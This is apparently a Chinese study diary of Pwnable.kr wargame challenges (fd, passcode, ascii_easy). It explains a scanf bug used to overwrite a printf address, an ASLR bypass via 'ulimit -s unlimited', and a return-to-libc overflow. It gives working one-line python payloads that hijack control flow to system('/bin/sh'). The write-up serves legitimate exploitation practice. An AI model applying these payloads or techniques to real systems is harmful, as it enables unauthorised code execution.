Pwnable.kr学习日记

Level1-[Toddler’s Bottle]

  1. fd

5个数组成20个字节，加起来等于hashcode

  1. passcode

gcc 编译的时候有

passcode.c:9:2: warning: format ‘%d’ expects argument of type ‘int ’, but argument 2 has type ‘int’ [-Wformat=]
scanf(“%d”, passcode1);
^
passcode.c:14:9: warning: format ‘%d’ expects argument of type ‘int ’, but argument 2 has type ‘int’ [-Wformat=]
scanf(“%d”, passcode2);
^

 scanf后面的参数没有加上取地址符，所以去默认从栈上取地址，输入名字的地方恰好在输入之前，可以用来修改下一个printf地址到call,system那段去
python -c "print('a'*96+'\x00\xa0\x04\x08'+'\n'+'134514147\n')" | ./passcode

  1. ascii_easy

看见了mmap函数了解一下,是个内存映射的函数，然后参照了一下别人的想法（果然高大上，涨姿势）Yiz96大神。可见vuln函数里面有栈溢出，但是地址ASLR是个大问题，hint 的ulimit就是很管用的了。
提示”ulimit”，这里是一个可以禁用ALSR的黑科技，当设置ulimit -s unlimited时，系统的ALSR将会失效，原因在于arch/x86/mm/mmap.c中：

ulimit -s unlimted 是设置shell程序的堆栈大小为无限制
gdb 去调试发现system的地址，因为ASLR已经关闭了，所以可以固定溢出到system(‘/bin/sh’)去，还是要找到地址符合ASCII码范围内的就行
最后的payload是这样的
(python -c “print ‘A’*0xa8 + ‘aaaa’ +’\x50\x52\x5c\x55’+’aaaa’+’\x31\x4a\x6e\x55’”;cat) | ./ascii_easy
